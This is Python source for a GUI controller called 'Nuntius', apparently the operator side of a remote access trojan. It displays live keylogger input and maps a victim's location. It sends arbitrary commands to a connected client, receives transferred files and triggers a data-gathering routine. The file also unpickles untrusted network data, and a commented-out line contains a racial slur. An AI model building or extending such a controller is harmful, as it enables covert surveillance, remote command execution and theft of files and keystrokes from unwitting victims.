from PIL import Image
import customtkinter
import tkinter
import threading
import socket
import tkintermapview
import subprocess
import time
import pickle
import os


class App(customtkinter.CTk):
    # Important lists
    SERVER_SOCKETS = []
    CLIENT_IP = []
    USER_GEOLOCATIONS = []

    # Socket IP adresses and PORTS
    filename_transfer_SOIP = "127.0.0.2"
    filename_transfer_SOPORT = 65433
    file_transfer_SOIP = "127.0.0.4"
    file_transfer_SOPORT = 1930
    cli_SOIP = "127.0.0.1"
    cli_SOPORT = 12345
    keylog_SOIP = "127.0.0.89"
    keylog_SOPORT = 65230
    gather_SOIP = "127.0.0.69"
    gather_SOPORT = 42069

    # Important Strings
    sep = ":***:"

    def __init__(self):
        super().__init__()
               
        self.title("Nuntius")
        self.geometry("1000x500")

        # create 2x2 grid system
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure((0, 3), weight=1)
        ############################################################################################
        #                                        UI design                                         #
        ############################################################################################
        #! Right Frame: Live Keylogger update
        self.frame = customtkinter.CTkFrame(master=self,
                               width=200,
                               height=600)
        self.frame.grid(row=0, column=3, sticky="ne")

         # Text Box 
        self.textbox = customtkinter.CTkTextbox(master=self.frame, width=200, height=500)
        self.textbox.grid(row=0, column=2,sticky="nsew")
        
        # create CTk scrollbar
        self.ctk_textbox_scrollbar = customtkinter.CTkScrollbar(self.frame,width=17, height=500, command=self.textbox.yview)
        self.ctk_textbox_scrollbar.grid(row=0, column=3,sticky="nw")
        
        # connect textbox scroll event to CTk scrollbar
        self.textbox.configure(yscrollcommand=self.ctk_textbox_scrollbar.set)
        
        
        #! Left Frame: Navigation Buttons
        self.frame1 = customtkinter.CTkFrame(master=self,
                               width=200,
                               height=500)
        self.frame1.grid(row=0, column=0, sticky="w", padx=10)
        
        # Buttons and the Logo
        self.my_image = customtkinter.CTkImage(light_image=Image.open("Data//new.png"),
                                  dark_image=Image.open("Data//new.png"),
                                  size=(120, 120))

        self.button = customtkinter.CTkButton(self.frame1, image=self.my_image,bg_color="black",hover_color="black",fg_color="black",text=None,)
        self.button.grid(row=0, column=0, pady =10,padx =10,sticky="n")

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            text="Killswitch",
                                            bg_color="red", 
                                            fg_color="black",
                                            hover_color="red",
                                            command=self.killswitch)
        self.button.grid(row=1, column=0, pady =10,sticky="n", padx=10)
      
        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            command=self.startPortScan, 
                                            text="Port Scan")
        self.button.grid(row=2, column=0, pady =10,sticky="n", padx=10)

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            command=self.openMapLevel,
                                            text="Geolocation")
        self.button.grid(row=3, column=0, pady =10,sticky="n", padx=10)     

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            command=self.showFiles,
                                            text="Files")
        self.button.grid(row=4, column=0, pady =10, sticky="n", padx=10)

        self.button = customtkinter.CTkButton(master=self.frame1, command=self.startGathering, text="Show Clients")
        self.button.grid(row=5,column=0,pady=10,sticky="n", padx=10)
        
        #! Center Frame: Main content/command line
        self.frame2 = customtkinter.CTkFrame(master=self,
                               width=600,
                               height=500)
        self.frame2.grid(row=0, column=2, sticky="s")

        self.entry = customtkinter.CTkEntry(master=self.frame2,
                               placeholder_text="CTkEntry",
                               width=400,
                               height=50,
                               border_width=2,
                               corner_radius=10)
        self.entry.grid(row=2, column=1, sticky="s")

        self.button = customtkinter.CTkButton(master=self.frame2,height=25,fg_color="green", command=self.send_to_client,text="Submit")
        self.button.grid(row=2, column=2,padx = 10, sticky="nw")
        ###########################################################################################
        #                                        System                                           #
        ###########################################################################################
        #! CLI SOCKET SEGMENT
        def start_CLI_socket():
            t3 = threading.Thread(target=create_CLI_socket)
            t3.daemon = True
            t3.start()

        def create_CLI_socket():
            global cli
            HOST = self.cli_SOIP  # Standard loopback interface address (localhost)
            PORT = self.cli_SOPORT  # Port to listen on (non-privileged ports are > 1023)
            # Start  CLI socket
            while True:
                try:    
                    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    cli.connect((HOST,PORT))
                    print("CLI_Success: Connected to CLI client.")
                    # Add the cli socket only once to the list
                    if cli not in self.SERVER_SOCKETS:
                        self.SERVER_SOCKETS.append(cli) 
                    break
                except Exception as e: print(f"Thrown Exception CLI: {e}")
                time.sleep(3)
            #? Checks if the client is still connected
            while True:
                print("Checking client status.")
                try: cli.send(bytes("TEST DATA", "utf-8")) #? Send data to see if Client is online
                except Exception as e: 
                    if "[WinError 10056] A connect request was made on an already connected socket" in str(e): pass
                    else: #? If not try to reconnect untill the client goes online
                        try: 
                            cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            cli.connect((HOST,PORT))
                            print("CLI_Success: Reconnected with the client.")
                            if cli not in self.SERVER_SOCKETS: self.SERVER_SOCKETS.append(cli) 
                        except: print(f"CLI Reconnection error: {e}")
                time.sleep(3)
        start_CLI_socket()    

        #? KEYLOGGER SOCKET
        def startSocket():
            print("\nServer started the keylog socket.")
            t2 = threading.Thread(target=createKeylogSocket)
            t2.daemon = True
            t2.start()
            

        def createKeylogSocket():
            HOST = self.keylog_SOIP  # Standard loopback interface address (localhost)
            PORT = self.keylog_SOPORT  # Port to listen on (non-privileged ports are > 1023)
            while True:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    self.SERVER_SOCKETS.append(s)
                    # Continue
                    s.bind((HOST, PORT))
                    self.textbox.insert("0.0", "KEYLOGGER TEXT INFO\n")
                    s.listen()
                    conn, addr = s.accept()
                    self.CLIENT_IP.append(addr)
                    with conn:
                        print(f"KEYLOGGER: Connected by {addr}")
                        self.USER_GEOLOCATIONS.append(conn.recv(64).decode("utf-8"))
                        self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
                        while True:
                            try: 
                                data = conn.recv(1024).decode("utf-8") 
                                self.textbox.insert("0.0", f"{data[1:-1]}\n")
                            except: print("\nKeylogger connection reset.\n"); break 
                            time.sleep(0.0001)
        startSocket()
        
        #? FILE_TRANSFER SOCKET
        def start_file_name_socket():
            print("\nDICT_TRANSFER: Server started.")
            t4 = threading.Thread(target=create_file_name_socket)
            t4.daemon = True
            t4.start()
            

        def create_file_name_socket():
            HOST = self.filename_transfer_SOIP  # Standard loopback interface address (localhost)
            PORT = self.filename_transfer_SOPORT  # Port to listen on (non-privileged ports are > 1023)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Add the server socket to a list
                self.SERVER_SOCKETS.append(s)
                # Continue
                s.bind((HOST, PORT))
                print("DICT_TRANSFER: Listening for clients.\n")
                s.listen()
                conn, addr = s.accept()
                self.CLIENT_IP.append(addr)
                # Accept the pickle list and print it
                with conn:
                    print(f"DICT_TRANSFER: Connected by {addr}")
                    data = conn.recv(1024)
                    data = pickle.loads(data)
                    print(data)
      
        def start_file_transfer_socket():
            print("\nFILE_TRANSFER: Server started.")
            t5 = threading.Thread(target=create_file_transfer_socket)
            t5.daemon = True
            t5.start()
            

        def create_file_transfer_socket():
            HOST = self.file_transfer_SOIP
            PORT = self.file_transfer_SOPORT

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # TODO Make a top Level progress bar  
                textbox = customtkinter.CTkTextbox(self, width=550, height=330)
                textbox.grid(row=0, column=2)
                # Create the Socket
                s.bind((HOST, PORT))
                s.listen()
                self.SERVER_SOCKETS.append(s)
                print("I AM LISTENING")
                while True:
                    print("I AM ACCEPTING")
                    conn, addr = s.accept()
                    self.CLIENT_IP.append(addr)
                    # Variables for the message while loop
                    msg_size = 77
                    msg = b''
                    while True:
                        # TODO Make the recv wait untill all 77 bytes are recieved                
                        while len(msg) < msg_size:
                            msg = conn.recv(77).decode("utf-8") # ! 64b(File bytes) + 13b(HEADER) 
                            #print(f"{len(msg)}, {msg}\n")
                        msg = msg.replace(" ","")
                        if msg:
                            
                            try:
                                cmd = msg.split(f"{self.sep}")[0]
                                data = msg.split(f"{self.sep}")[1]
                                if msg ==  "FINISH:***:Completed": 
                                    print(msg)
                                    print(cmd)
                                    print(data)
                                
                                #data = "".join()
                            except Exception as e: 
                                print(f"\nCMD:{cmd}")
                                print(f"DATA:{data}") 
                                print(f"Error:{e}\n")

                            match cmd:
                                case "FILENAME_TEXT":
                                    print(f"\nCreated TXT file: {msg}")
                                    new_file = open(f"Files/{data}", "w")
                                    textbox.insert("0.0", f"{msg}\n")
                                    cmd = ""

                                case "TXT_DATA":
                                    #print(f"\nWriting to TXT file: {data}")
                                    filesize = int(data)
                                    while True:
                                        if filesize < -3000: break
                                        try: msg = conn.recv(64).decode("utf-8")
                                        except Exception as e: print(str(e))
                                        if filesize < 0 and "::END_OF_THE_SOCKET::" in msg: 
                                            cmd = ""
                                            msg = ""
                                            print("Recieved the Trailer.")
                                            new_file.close()     
                                            textbox.insert("0.0", f"\nFile transfered!\n")   
                                            break
                                        new_file.write(msg)
                                        filesize = filesize-64
                                        #new_file.write("NIGGA")
                                        print("---------------------")
                                        print("FILESIZE", filesize)
                                        print("MSG", msg)
                                        print("---------------------")
       
                                case "FINISH":
                                    print("\n")
                                    print(f"\nClosing the file: {msg}")
                                    #textbox.insert("0.0", f"\nAll files transfered!\n")
                                    #new_file.close()
                                    cmd = ""
         
        start_file_name_socket()
        start_file_transfer_socket()
    ############################################################################################
    #                                        Functions                                         #
    ############################################################################################
    def send_to_client(self):
        global cli
        data = self.entry.get()
        try: cli.send(bytes(f"{data}", "utf-8"))
        except: pass
        print(f"Sent: {data}, to Client")
            
    def showFiles(self):
        subprocess.Popen('explorer "Files"')         
    
    def killswitch(self): # Shuts down all active sockets and removes them from the list
        print(self.SERVER_SOCKETS)
        try:
            for socket in self.SERVER_SOCKETS:
                socket.shutdown(socket.SHUT_RDWR)
                socket.close()
                self.SERVER_SOCKETS.remove(socket)
            print("\n!!! KILLSWITCH: Succsesfully shutdown all connections. !!!\n")
        except:
            print("\n!!! KILLSWITCH_Error: Socket shutdown. Prob no sockets to close. !!!\n")


    def openScanner(self):
        import portscaner
        root_tk = customtkinter.CTkToplevel(self)
        root_tk.geometry("300x200")
        root_tk.title("Open Ports")    
        label = customtkinter.CTkLabel(master=root_tk, text=f"Loading Data.")
        label.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)

        print(str(self.SERVER_SOCKETS))
        portscaner.scan_ports("127.0.0.1", 70)
        
        # GUI
        label1 = customtkinter.CTkLabel(master=root_tk, text=f"Open Ports: {portscaner.OPEN_PORTS}")
        label1.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
        
        print(portscaner.OPEN_PORTS)

    def startPortScan(self):
        portThread = threading.Thread(target=self.openScanner)
        portThread.daemon = True
        portThread.start()
    
    def openMapLevel(self):
        # create tkinter window
        def create_geoTopLevel():
            root_tk = customtkinter.CTkToplevel(self)
            root_tk.geometry("600x450")
            root_tk.title("Location mapping.")

            # create map widget
            map_widget = tkintermapview.TkinterMapView(root_tk, width=800, height=600, corner_radius=0)
            map_widget.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
            try:
                map_widget.set_address(f"{self.USER_GEOLOCATIONS}")
            except:
                map_widget.set_address("colosseo, rome, italy")

        geoThread = threading.Thread(target=create_geoTopLevel)
        geoThread.daemon = True
        geoThread.start()

    def startGathering(self):
        th = threading.Thread(target=self.Gathering)
        th.daemon=True
        th.start()

    def Gathering(self):
        print("Starting1")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind((self.gather_SOIP, self.gather_SOPORT))
            window = customtkinter.CTkToplevel(self)
            window.geometry("500x300")
            our_box = customtkinter.CTkTextbox(window, 480, 280, text_color='red')
            our_box.place(x=10, y=10)
            window.title("Client List")
            cli.send('run -gatherData'.encode("utf-8"))
            sock.listen()
            conn, _ = sock.accept()
            print("Accepted")
            infos = []
            while True:
                data = conn.recv(1024)
                if "END_SENDING" in data.decode("utf-8"):
                    break
                infos.append(data.decode('utf-8'))
                print(infos)
            for info in infos:
                our_box.insert(customtkinter.END, f"{info}\n")
    
# Run dze up
app = App()
app.mainloop()
